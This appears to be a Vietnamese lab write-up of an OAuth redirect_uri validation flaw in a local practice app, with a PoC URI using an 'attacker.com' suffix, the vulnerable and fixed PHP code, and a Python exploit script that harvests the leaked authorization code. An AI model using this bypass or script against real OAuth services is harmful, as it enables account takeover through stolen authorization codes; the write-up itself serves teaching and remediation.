1. OAuth Redirect URI Validation Vulnerability

URL: `http://127.0.0.1/OhMyCrab/modules/oauth/redirect_uri.php`

Ứng dụng triển khai OAuth 2.0 Authorization Code Flow nhưng không thực hiện validation chặt chẽ đối với redirect_uri, thay vào đó chỉ sử dụng kiểm tra chuỗi đơn giản, logic so khớp không chính xác. Do đó, attacker có thể bypass cơ chế whitelist redirect URI bằng cách craft một URL hợp lệ về mặt substring nhưng trỏ tới domain do attacker kiểm soát. Hậu quả là authorization server sẽ redirect kèm authorization code tới endpoint độc hại

PoC

- Truy cập `http://127.0.0.1/OhMyCrab/modules/oauth/redirect_uri.php`

- Nhập redirect URI: `http://127.0.0.1/OhMyCrab/modules/oauth/callback.php.attacker.com`

<img width="598" height="474" alt="image" src="https://github.com/user-attachments/assets/560085c7-b4c7-48e2-8d04-d10659bbaa22" />

- Hệ thống thực hiện redirect OAuth flow: Authorization request được khởi tạo, user login và consent, authorization server redirect về redirect_uri

- Nhấn chuyển hướng và quan sát kết quả

<img width="894" height="396" alt="image" src="https://github.com/user-attachments/assets/657ab55e-4fac-488f-b310-904b9aac42f2" />

Ứng dụng redirect đến: `http://127.0.0.1/OhMyCrab/modules/oauth/callback.php.attacker.com?code=b8cee6a70005dc3dd191e60b108b27b5`

Authorization code bị leaked tới một endpoint do attacker kiểm soát thông qua việc thao túng tham số `redirect_uri`, cho phép exfiltration mã authorization code của OAuth.

Phân tích Source Code

```
if (isset($_GET['redirect_uri'])) {
    $client_id = "client_1"; 
    $response_type = "code";
    $redirect_uri = $_GET['redirect_uri'];
    if (strpos($redirect_uri, $clients[$client_id]['redirect_uri']) !== 0) {
        $message = "Đường dẫn chuyển hướng (redirect_uri) không hợp lệ!";
    } else {
        $code = bin2hex(random_bytes(16));
        $_SESSION['auth_code'] = $code;
        header("Location: $redirect_uri?code=$code");
        exit;
    }
```

- Kiểm tra prefix không an toàn

- không validate strict origin

- tin tưởng input trực tiếp

Cách khắc phục

```
if (isset($_GET['redirect_uri'])) {
    $client_id = "client_1"; 
    $response_type = "code";
    $redirect_uri = trim($_GET['redirect_uri']);
    $parsed_url = parse_url($redirect_uri);
    $host = $parsed_url['host'] ?? '';
    if ($clients[$client_id]['redirect_uri'] !== $redirect_uri) {
        $message = "Chặn đứng! URL chuyển hướng không khớp chính xác với whitelist!";
    } 
    elseif ($host !== '127.0.0.1' && $host !== 'localhost') {
        $message = "Tên miền không nằm trong phạm vi cho phép!";
    }
    else {
        $code = bin2hex(random_bytes(16));
        $_SESSION['auth_code'] = $code;
        header("Location: $redirect_uri?code=$code");
        exit;
    }
}
```

- Whitelist exact match

- Parse URL để kiểm tra host

- Best practice OAuth

Script khai thác

```
import requests
from urllib.parse import urlparse, parse_qs

url = "http://127.0.0.1/OhMyCrab/modules/oauth/redirect_uri.php"
attacker_domain = ".attacker.com"
valid_prefix = "http://127.0.0.1/OhMyCrab/modules/oauth/callback.php"
payload = {
    "redirect_uri": f"{valid_prefix}{attacker_domain}"
}

print(f"Đang gửi payload bypass: {payload['redirect_uri']}")
response = requests.get(url, params=payload, allow_redirects=False)
if response.status_code == 302 and 'Location' in response.headers:
    redirect_target = response.headers['Location']
    print(f"\nKhai thác thành công")
    print(f"Trình duyệt bị ép chuyển hướng đến: {redirect_target}")
    parsed_url = urlparse(redirect_target)
    captured_code = parse_qs(parsed_url.query).get('code', [None])[0]
    
    if captured_code:
        print(f"Authorization Code: {captured_code}")
    else:
        print("Không tìm thấy authorization code.")
else:
    print("\nKhai thác thất bại.")
    print(f"Status Code: {response.status_code}")
    print(f"Phản hồi từ server: {response.text.strip()}")
```
- Mục tiêu script: gửi redirect_uri độc hại, trigger OAuth redirect, thu code về attacker endpoint
